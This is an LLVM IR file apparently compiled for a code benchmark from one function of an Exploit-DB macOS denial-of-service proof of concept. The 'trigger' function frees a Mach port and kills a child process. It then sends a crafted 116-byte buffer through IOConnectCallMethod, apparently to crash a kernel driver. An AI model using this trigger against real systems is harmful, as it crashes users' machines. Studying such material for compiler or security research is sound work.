; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/osx/dos/extr_40652.c_trigger.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/osx/dos/extr_40652.c_trigger.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@MACH_PORT_NULL = common dso_local global i64 0, align 8
@.str = private unnamed_addr constant [26 x i8] c"unable to get connection\0A\00", align 1
@.str.1 = private unnamed_addr constant [17 x i8] c"got user client\0A\00", align 1
@.str.2 = private unnamed_addr constant [14 x i8] c"killed child\0A\00", align 1
@.str.3 = private unnamed_addr constant [28 x i8] c"making external method call\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @trigger(i32 %0, i32 %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i64, align 8
  %7 = alloca i32, align 4
  %8 = alloca [116 x i8], align 16
  store i32 %0, i32* %3, align 4
  store i32 %1, i32* %4, align 4
  %9 = load i32, i32* %4, align 4
  %10 = call i64 @get_connection(i32 %9)
  store i64 %10, i64* %6, align 8
  %11 = load i64, i64* %6, align 8
  %12 = load i64, i64* @MACH_PORT_NULL, align 8
  %13 = icmp eq i64 %11, %12
  br i1 %13, label %14, label %16

14:                                               ; preds = %2
  %15 = call i32 @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str, i64 0, i64 0))
  br label %34

16:                                               ; preds = %2
  %17 = call i32 @printf(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.1, i64 0, i64 0))
  %18 = call i32 (...) @mach_task_self()
  %19 = load i32, i32* %4, align 4
  %20 = call i32 @mach_port_deallocate(i32 %18, i32 %19)
  %21 = load i32, i32* %3, align 4
  %22 = call i32 @kill(i32 %21, i32 9)
  %23 = call i32 @wait(i32* %7)
  %24 = call i32 @printf(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.2, i64 0, i64 0))
  %25 = bitcast [116 x i8]* %8 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 16 %25, i8 0, i64 116, i1 false)
  %26 = getelementptr inbounds [116 x i8], [116 x i8]* %8, i64 0, i64 56
  store i8 -128, i8* %26, align 8
  %27 = getelementptr inbounds [116 x i8], [116 x i8]* %8, i64 0, i64 0
  %28 = bitcast i8* %27 to i32*
  store i32 1094795585, i32* %28, align 16
  %29 = load i64, i64* %6, align 8
  %30 = getelementptr inbounds [116 x i8], [116 x i8]* %8, i64 0, i64 0
  %31 = call i32 @IOConnectCallMethod(i64 %29, i32 0, i32* null, i32 0, i8* %30, i32 116, i32* null, i32* null, i32* null, i32* null)
  store i32 %31, i32* %5, align 4
  %32 = load i32, i32* %5, align 4
  %33 = call i32 @MACH_ERR(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.3, i64 0, i64 0), i32 %32)
  br label %34

34:                                               ; preds = %16, %14
  ret void
}

declare dso_local i64 @get_connection(i32) #1

declare dso_local i32 @printf(i8*) #1

declare dso_local i32 @mach_port_deallocate(i32, i32) #1

declare dso_local i32 @mach_task_self(...) #1

declare dso_local i32 @kill(i32, i32) #1

declare dso_local i32 @wait(i32*) #1

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i1 immarg) #2

declare dso_local i32 @IOConnectCallMethod(i64, i32, i32*, i32, i8*, i32, i32*, i32*, i32*, i32*) #1

declare dso_local i32 @MACH_ERR(i8*, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { argmemonly nounwind willreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
